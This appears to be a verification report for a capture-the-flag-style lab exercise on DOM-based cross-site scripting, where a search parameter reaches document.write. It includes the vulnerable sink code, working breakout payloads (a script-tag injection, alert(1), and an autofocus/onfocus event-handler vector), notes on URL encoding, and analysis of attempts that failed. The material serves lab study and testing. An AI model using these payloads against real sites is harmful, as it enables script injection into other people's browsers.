# Verification — DOM XSS in document.write(source: location.search)

## Methodology
1. Static review: read the inline script in the search-results page (curl) to identify
   source (`location.search`) and sink (`document.write`) and derive the exact
   attribute context of the injected value.
2. Server-side mapping: confirm the SSR `<h1>` reflection is (or is not) encoded to
   separate server-rendered XSS from the DOM sink.
3. Client-side proof: execute in a real HTML parser (headless Chromium) with a
   **non-blocking** probe (`document.title=…`) to avoid `alert()` freezing the dump.
4. Lab acceptance: deliver `alert(1)` in a real browser tab; confirm `is-solved` banner.

## Evidence

### 1. Sink code identified (curl, GET /?search=probeterm)
```
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) { trackSearch(query); }
```

### 2. SSR path is encoded — a red herring (curl)
```
GET /?search=ssrPROBE</h1>"'
  → <h1>0 search results for 'ssrPROBE&lt;/h1&gt;&quot;&apos;'</h1>
```
Reading: server reflects the term but HTML-encodes it → server-rendered injection is NOT
applicable. The exploitable path is client-side only.

### 3. Client-side execution proof (headless Chromium dump-dom)
Payload (tag-close vector), single percent-encoding of reserved chars:
```
/?search=%22%3E%3Cscript%3Edocument.title%3D'DOMXSSFIRED'%3C/script%3E
```
```
dump-dom exit 0;  <title>DOMXSSFIRED</title> present
img element emitted by document.write: <img src="/resources/images/tracker.gif?searchTerms=">
```
Meaning: the injected `">` closed the attribute and the tag; the written `<script>` was
executed by the parser (scripts written via document.write during parsing DO run).

### 4. Lab acceptance
Navigated a real browser to `/?search=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`.
Alert fired; banner flipped to `is-solved` (confirmed over 4 consecutive polls).

### 5. Attribute-injection (scriptless) vector confirmed
```
/?search=%22%20autofocus%20onfocus%3Ddocument.title%3D'ATTRFIRE'%20x%3D%22
→ ATTRFIRE observed
```
Shows the sink works for both `<script>` and event-handler payloads — a single
breakout primitive (`"` in a double-quoted attribute).

### 6. URL-encoding / double-decoding semantics (important for delivery)
| Navigated URL | Server received (via h1 echo) | Executed? |
|---|---|---|
| `search=%22%27%3C%2Fh1%3E` (single-encode) | `%22%27%3C%2Fh1%3E` → JS decodes → `"'</h1>` | yes (payload chars decoded once by JS) |
| `search=%2522%2527…` (double-encode) | `%22%27…` → browser normalization decoded `%25`→`%` once | yes (net 2 decodes) |
Findings:
- The browser **each navigation step** can percent-collapse `%25`→`%` (and `%2F`→`/`),
  so double-encoding may still fire in a browser address bar — but delivery should not
  rely on normalization quirks. **Single-encode only the reserved characters** that must
  reach the parser (`"` `<` `>` `'` `=`), and never double-encode in an HTML attribute of
  an anchor or JS location assignment.
- `URLSearchParams.get` performs exactly ONE decode of `location.search`.

### 7. Failed-candidate analysis
| Attempt | Result | Why it failed / is wrong |
|---|---|---|
| `</script><script>alert(1)</script>` | does not produce markup injection | `</script>` is only special inside an existing `<script>` element; here the payload is written as body *markup* by document.write, and a bare `</script>` end tag with no open script element is inert. The attribute is never closed, so the payload stays inside the `src` value. |
| SSR XSS via `search` → `<h1>` | no | server HTML-encodes the reflection |
| Payload without `"` (e.g., `<script>…` only) | no | value sits inside a double-quoted attribute; MUST first terminate `src="…"` with `"` and the tag with `>`. |
| Double-encoded payload via pure curl (no browser) | no | no browser = URLSearchParams never runs; DOM XSS cannot be proven via curl alone. |

Reading failures correctly: the DOM path REQUIRES the `"`+`>` breakout because of the
quoted-attribute context; anything that doesn't terminate the attribute cannot escape.

## Reproducibility (curl, response-level only)
```
curl "$BASE/?search=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"   # shows static JS, NOT the exploit result
```
DOM XSS is verified ONLY in an executing browser (headless dump, CDP, or real tab).

## Confirmation criteria
- CONFIRMED: written `<script>` executes (title mutation), event-handler vector executes,
  real-browser `alert(1)` accepted by lab.
- Use non-blocking probes (`document.title`) for assertions; treat headless-dump hangs on
  `alert()` as a symptom only.